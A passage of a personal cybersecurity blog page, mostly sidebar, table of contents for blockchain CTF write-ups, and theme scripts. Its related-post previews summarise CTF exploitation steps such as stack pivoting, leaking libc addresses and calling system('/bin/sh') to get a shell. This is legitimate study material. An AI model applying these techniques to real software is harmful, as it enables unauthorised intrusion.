Poisoning</div></div><div class="info-2"><div class="info-item-1"> 记录一下这学期最难的一次网络安全实验，恰逢期末，之后回来填坑    [1] 虚拟机 virtualbox 配置如何便捷地 copy 虚拟机(直到写这篇 wp 才想起来可以 STFW，我最开始用的 vdi…还需要用 VBoxManage internalcommands sethduuid /path/to/your.vdi 重新解绑uuid) 由于此次打开的虚拟机较多，所以每个虚拟机内存只分配2GB即可 之后，把双向粘贴板和双向拖放打开，再把“显示 -&gt; 屏幕”中扩展特性的“启用3D加速”打开（要不然会花屏） 之后再在“网络 -&gt; 网卡1”栏目中，将连接方式改为“内部网络”，然后名称改为intnet0/1/2（这里根据自己需求来写，比如我配的权威DNS就是intnet1） 最后进入虚拟机中，在上方栏目的“设备”中点击安装增强功能，它会自动打开一个文件夹，在终端里运行autorun.sh即可自动安装，之后重启虚拟机就可以启用双向粘贴板和拖放了 [2] 虚拟机网络配置IP...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/en/posts/31252.html" title="Pwn - Practice1"><img class="cover" src="/en/img/cover1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-14</div><div class="info-item-2">Pwn - Practice1</div></div><div class="info-2"><div class="info-item-1"> 练习题 wp 记录    目录 Tools in pwn buuctf babyheap_0ctf_2017 buuctf ogeek2019babyrop_wp buuctf hitcontraining_bamboobox buuctf hitcontraining_uaf buuctf hitcontraining_magicheap buuctf ciscn_2019_n_3 buuctf babyfengshui_33c3_2016 buuctf hitcontraining_heapcreator buuctf hitcon2014_stkof buuctf jarvisoj_level5 buuctf ciscn_2019_es_7  0x00 Tools in Pwnpwndbg gdb.attach(io,’xxx’)  xxx 为 GDB 的调试语句，比如’b main’ 或者 ‘n 285’    gadgetsROPgadget 面向 elf 文件使用，详情RTFMROPgadget -h  命令省流  ROPgadget --binary ./pwn...</div></div></div></a><a class="pagination-related" href="/en/posts/56099.html" title="comp - 2023HwsSDU专场CTF-wp"><img class="cover" src="/en/img/cover6.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-19</div><div class="info-item-2">comp - 2023HwsSDU专场CTF-wp</div></div><div class="info-2"><div class="info-item-1"> HWS！PWN+RE+CRYPTO    RERe 这个题本来打好逆向后的包准备写 wp 的，结果重新加载的时候给覆盖了…就不配图了，函数顺序按照反汇编从上到下来分析的。  拿到这个题看到有反调试，没 patch ，直接静态分析了 - 1st important function第一个重要函数里有一个 flag{} 的判断，还有一个对于’-‘的判断，可以猜测 flag 的格式为 flag{uuid} 接下来的一个函数有花指令，把 E8 改成 90 以后重新反汇编，还是没有啥东西…为了不影响后面做题，还是回到一开始的地方把 jz 改成了 jnz ，然后动调发现这个带花的函数基本没啥用，好像就调用了个__chkesp函数，但我不太清楚这是干啥的，就直接忽略了 - 2nd important function第二个重要函数对我们输入的 flag...</div></div></div></a><a class="pagination-related" href="/en/posts/7380.html" title="comp - 2023香山杯Pwn &amp; RE-wp"><img class="cover" src="/en/img/cover4.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-15</div><div class="info-item-2">comp - 2023香山杯Pwn &amp; RE-wp</div></div><div class="info-2"><div class="info-item-1"> 香山杯！Pwn ak + RE 差几分钟就写完xxTEA啦😭    REurl从哪儿来 断点下在这，知道他会在buffer指向的地址生成一个文件，让程序跑完，能看到这个文件ida打开，因为它问url是什么，所以我们直接看szurl结果这个不是flag，看到url问我们是如何解密的，所以我们回到上面那一堆数据里面，我们看一下v13flag就在这 PwnMove栈迁移到bss段的skdd，泄露puts，libcsearcher查到puts的libc是2.27，glibc-all-in-one下一个出来，然后返回main函数在skdd里写system(“/bin/sh”)，本来是想再栈迁移一遍，结果发现直接do_system了，稍微修改了一下就getshell了12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273# exp头...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/en/img/avatar.jpg" onerror="this.onerror=null;this.src='/en/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">HeyGap</div><div class="author-info-description">An undergraduate student of Cybersecurity at SDU.</div><div class="site-data"><a href="/en/archives/"><div class="headline">Articles</div><div class="length-num">31</div></a><a href="/en/tags/"><div class="headline">Tags</div><div class="length-num">24</div></a><a href="/en/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/HeyGap"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/HeyGap" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2310769056@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">欢迎来到我的博客，主要用来记录一些学习笔记和生活感悟。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#FF-%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-text">[FF] 常用工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#FF-1-forge"><span class="toc-text">[FF-1] forge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FF-1-1-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-text">[FF-1-1] 动态调试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0-2024-SCTF"><span class="toc-text">[0] 2024 SCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-0-steal"><span class="toc-text">[0-0] steal</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-0-0-analysis"><span class="toc-text">[0-0-0] analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0-0-1-perform"><span class="toc-text">[0-0-1] perform</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0-0-1-0-initialization-code"><span class="toc-text">[0-0-1-0] initialization code</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0-0-1-1-runtime-code"><span class="toc-text">[0-0-1-1] runtime code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0-1-staking"><span class="toc-text">[0-1] staking</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2024-WMCTF-Claim-Guard"><span class="toc-text">[1] 2024 WMCTF Claim-Guard</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-0-%E6%A6%82%E8%BF%B0"><span class="toc-text">[1-0] 概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E5%88%86%E6%9E%90"><span class="toc-text">[1-1] 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-0-main-rs"><span class="toc-text">[1-1-0] main.rs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-1-executor-rs"><span class="toc-text">[1-1-1] executor.rs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-2-strategy-rs"><span class="toc-text">[1-1-2] strategy.rs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E8%A7%A3%E9%A2%98"><span class="toc-text">[1-2] 解题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-0-%E7%88%86%E7%A0%B4-keccak256"><span class="toc-text">[1-2-0] 爆破 keccak256</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-1"><span class="toc-text">[1-2-1]</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-2024-Sekai"><span class="toc-text">[2] 2024 Sekai</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-0-Play-to-Earn"><span class="toc-text">[2-0] Play to Earn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E3%82%A4%E3%83%99%E3%83%B3%E3%83%88%EF%BC%81"><span class="toc-text">[2-1] イベント！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-ZOO"><span class="toc-text">[2-2] ZOO</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-2024-DASCTF-%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E8%B5%9B"><span class="toc-text">[3] 2024 DASCTF 金秋十月赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-Open-sesame"><span class="toc-text">[3-1] Open sesame</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-2025-SUCTF"><span class="toc-text">[4] 2025 SUCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-Onchain-Machine"><span class="toc-text">[4-1] Onchain Machine</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/en/posts/34368.html" title="fuzz - 原理学习"><img src="/en/img/cover2.jpg" onerror="this.onerror=null;this.src='/en/img/404.jpg'" alt="fuzz - 原理学习"/></a><div class="content"><a class="title" href="/en/posts/34368.html" title="fuzz - 原理学习">fuzz - 原理学习</a><time datetime="2025-02-14T05:46:00.000Z" title="Created 2025-02-14 13:02:00">2025-02-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/en/posts/18184.html" title="blockchain - openzeppelin 源码阅读"><img src="/en/img/cover3.jpg" onerror="this.onerror=null;this.src='/en/img/404.jpg'" alt="blockchain - openzeppelin 源码阅读"/></a><div class="content"><a class="title" href="/en/posts/18184.html" title="blockchain - openzeppelin 源码阅读">blockchain - openzeppelin 源码阅读</a><time datetime="2025-02-05T10:15:00.000Z" title="Created 2025-02-05 18:02:00">2025-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/en/posts/13129.html" title="blockchain - Uniswap V2"><img src="/en/img/cover7.jpg" onerror="this.onerror=null;this.src='/en/img/404.jpg'" alt="blockchain - Uniswap V2"/></a><div class="content"><a class="title" href="/en/posts/13129.html" title="blockchain - Uniswap V2">blockchain - Uniswap V2</a><time datetime="2025-02-04T06:09:00.000Z" title="Created 2025-02-04 14:02:00">2025-02-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/en/posts/38292.html" title="blockchain - All Your Tokens are Belong to Us Demystifying Address Verification Vulnerabilities in Solidity Smart Contracts论文阅读笔记"><img src="/en/img/cover4.jpg" onerror="this.onerror=null;this.src='/en/img/404.jpg'" alt="blockchain - All Your Tokens are Belong to Us Demystifying Address Verification Vulnerabilities in Solidity Smart Contracts论文阅读笔记"/></a><div class="content"><a class="title" href="/en/posts/38292.html" title="blockchain - All Your Tokens are Belong to Us Demystifying Address Verification Vulnerabilities in Solidity Smart Contracts论文阅读笔记">blockchain - All Your Tokens are Belong to Us Demystifying Address Verification Vulnerabilities in Solidity Smart Contracts论文阅读笔记</a><time datetime="2025-01-13T12:01:00.000Z" title="Created 2025-01-13 20:01:00">2025-01-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/en/posts/9333.html" title="2024年终总结"><img src="/en/img/cover2.jpg" onerror="this.onerror=null;this.src='/en/img/404.jpg'" alt="2024年终总结"/></a><div class="content"><a class="title" href="/en/posts/9333.html" title="2024年终总结">2024年终总结</a><time datetime="2025-01-12T04:55:00.000Z" title="Created 2025-01-12 12:01:00">2025-01-12</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/cover3.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2025 By HeyGap</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional and Simplified Chinese">EN</button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/en/js/utils.js"></script><script src="/en/js/main.js"></script><script src="/en/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><script data-pjax src="/en/self/btf.js"></script><script data-pjax src="/en/self/ch_en.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/en/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
    console.log('已挂载butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'undefined'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><!-- hexo injector body_end end --></body></html>